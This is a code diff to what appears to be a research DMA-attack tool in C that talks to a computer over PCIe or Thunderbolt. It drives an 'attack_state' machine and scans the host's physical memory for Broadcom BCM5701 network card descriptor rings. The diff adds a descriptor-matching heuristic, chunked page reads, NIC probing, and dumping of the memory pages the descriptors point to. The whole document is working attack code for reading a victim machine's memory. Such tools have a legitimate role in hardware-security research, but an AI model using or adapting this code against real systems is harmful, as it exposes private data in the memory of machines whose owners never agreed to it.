@@ -104,7 +104,16 @@ is_probably_descriptor(const struct bcm5701_send_buffer_descriptor *buffer)
 {
 	return ((buffer->flags &
 		(uint32_mask_enable_bits(5, 3) | uint32_mask_enable_bits(14, 10)))
-		== 0) && buffer->length != 0;
+		== 0) && buffer->length != 0 && (buffer->reserved == 0) &&
+		(buffer->host_address != 0);
+}
+
+bool
+is_brett_descriptor(const struct bcm5701_send_buffer_descriptor *buffer)
+{
+	return ((buffer->host_address & 0xffffffff) == 0) &&
+		((buffer->host_address & 0xff00000000000000) == 0x0800000000000000) &&
+		(buffer->vlan_tag == 0);
 }
 
 void
@@ -126,11 +135,26 @@ endianess_swap_descriptors(struct bcm5701_send_buffer_descriptor *descriptor,
 	}
 }
 
+static inline uint64_t
+get_page_address(uint64_t address)
+{
+	return (address & ~uint64_mask(12));
+}
+
 int
 read_page(uint64_t address, uint32_t devfn, uint8_t* buffer)
 {
-	uint64_t page_address = address & ~uint64_mask(12);
-	return perform_dma_read(buffer, 4096, devfn, 0, page_address);
+	const int CHUNK_SIZE = 256;
+	int i, read_result = 0;
+	uint64_t page_address = get_page_address(address);
+	for (i = 0; i < 4096; i += CHUNK_SIZE) {
+		read_result = perform_dma_read((buffer + i), CHUNK_SIZE, devfn, 0,
+			(page_address + i));
+		if (read_result != 0) {
+			break;
+		}
+	}
+	return read_result;
 }
 
 void
@@ -152,8 +176,32 @@ print_page(uint8_t* page_data)
 	}
 }
 
+int
+print_page_at_address(uint64_t address, uint32_t devfn)
+{
+	int read_result;
+	uint8_t page_data[4096];
+
+	read_result = read_page(address, devfn, page_data);
+
+	if (read_result == -1) {
+		printf("UR trying read page.\n");
+		return read_result;
+	}
+
+	printf("0x%lx\n", get_page_address(address));
+	print_page(page_data);
+
+	return read_result;
+}
+
 enum attack_state {
 	AS_UNINITIALISED,
+	AS_PROBING_NIC,
+	/* This doesn't work from Thunderbolt. The brdge itself seems to drop the
+	 * config requests. XXX: Would be interesting to try on FreeBSD
+	 * internally.
+	 */
 	AS_LOOKING_FOR_DESCRIPTOR_RING
 };
 
@@ -218,6 +266,14 @@ respond_to_packet(struct packet_response_state *state,
 			0);
 
 		break;
+	case CPL:
+		printf("Got CPL ");
+		if (in->data_length > 0) {
+			printf("with data[0] 0x%x.\n", in->data[0]);
+		} else {
+			printf("without data.\n");
+		}
+		break;
 	default:
 		printf("Ignoring %s (0x%x) TLP.\n", tlp_type_str(dword0->type),
 			dword0->type);
@@ -242,9 +298,9 @@ main(int argc, char *argv[])
 	struct packet_response_state packet_response_state;
 	packet_response_state.attack_state = AS_UNINITIALISED;
 	int read_result;
-	uint64_t read_addr = 0x400000;
+	/*uint64_t next_read_addr = 0x400000;*/
+	uint64_t read_addr, next_read_addr = 0x00000;
 	struct bcm5701_send_buffer_descriptor descriptors[16];
-	uint8_t page_data[4096];
 	/*
 	 * We have found that in practise the tx ring is not located lower
 	 * than this.
@@ -278,26 +334,40 @@ main(int argc, char *argv[])
 		switch (packet_response_state.attack_state) {
 		case AS_UNINITIALISED:
 			break;
+		case AS_PROBING_NIC:
+			/* This doesn't work from Thunderbolt: we get UR responses coming
+			 * from the bridges' ID.
+			 */
+			create_config_request_header(&raw_tlp_out, TLPD_READ,
+				packet_response_state.devfn, 0, 0xF, bdf_to_uint(4, 0, 0), 0);
+			send_result = send_tlp(&raw_tlp_out);
+			printf("NIC probe result: %d.\n", send_result);
+			break;
 		case AS_LOOKING_FOR_DESCRIPTOR_RING:
 			read_result = perform_dma_read((uint8_t *)descriptors,
-				256, packet_response_state.devfn, 0, read_addr);
-			if (read_result != -1) {
-				printf("Read 0x%lx OK.", read_addr);
-				if (any_descriptor_nonzero(descriptors, 16)) {
-					endianess_swap_descriptors(descriptors, 16);
-					if (is_probably_descriptor(&(descriptors[0]))) {
-						putchar('\n');
-						print_descriptors(descriptors, 16);
-						read_result = read_page(descriptors[0].host_address,
-							packet_response_state.devfn, page_data);
-						assert(read_result != -1);
-						print_page(page_data);
-					}
-				} else {
-					printf("All fields 0.\n");
-				}
+				256, packet_response_state.devfn, 0, next_read_addr);
+			read_addr = next_read_addr;
+			next_read_addr += 4096;
+			if (read_result == -1 || !any_descriptor_nonzero(descriptors, 16)) {
+				continue;
 			}
-			read_addr += 4096;
+			endianess_swap_descriptors(descriptors, 16);
+			/*if (!is_probably_descriptor(&(descriptors[0]))) {*/
+			if (!is_brett_descriptor(&(descriptors[0]))) {
+				continue;
+			}
+			printf("Probably a descriptor at 0x%lx OK.\n", read_addr);
+			print_descriptors(descriptors, 16);
+			/*print_page_at_address(descriptors[0].host_address,*/
+				/*packet_response_state.devfn);*/
+			printf("host_address >> 32 = 0x%lx.\n",
+				descriptors[0].host_address >> 32);
+			/*print_page_at_address(descriptors[0].host_address >> 32,*/
+				/*packet_response_state.devfn);*/
+			printf("host_address with mask = 0x%lx.\n",
+				descriptors[0].host_address & uint64_mask(32));
+			/*print_page_at_address(descriptors[0].host_address & uint64_mask(32),*/
+				/*packet_response_state.devfn);*/
 			break;
 		}
 	}
